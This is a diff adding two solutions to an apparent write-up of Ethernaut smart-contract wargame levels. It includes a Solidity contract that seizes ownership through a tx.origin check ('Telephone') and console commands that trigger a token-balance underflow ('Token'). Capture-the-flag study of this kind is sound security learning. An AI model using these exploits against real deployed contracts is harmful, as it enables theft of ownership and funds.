@@ -145,3 +145,40 @@ Deploy/execute the contract with `npx hardhat run scripts/deploy.js --network et
 Can verify with `await contract.consecutiveWins() == 10` in the Ethernaut Javascript console
 
 Note that when submitting the instance in the Ethernaut interface will need to update the nonce used by MetaMask since transactions occurred using Hardhat.  Enable this for the account in Settings, Advanced, Customize transaction nonce.
+
+## 04 Telephone
+
+Ref: https://ethereum.stackexchange.com/a/1892
+
+```sol
+pragma solidity ^0.8.0;
+
+interface ITelephone {
+    function changeOwner(address _owner) external;
+}
+
+contract TelephoneAttack {
+    ITelephone public target;
+
+    constructor(address _target) {
+        target = ITelephone(_target);
+    }
+
+    function attack() external {
+        target.changeOwner(tx.origin);
+    }
+}
+```
+
+## 05 Token
+
+```js
+(await contract.balanceOf(player)).toString()
+(await contract.balanceOf(level)).toString()
+
+// Must send to another address (ie not player) otherwise underflow effects will be negated
+await contract.transfer(level, 21)
+
+(await contract.balanceOf(player)).toString()
+(await contract.balanceOf(level)).toString()
+```
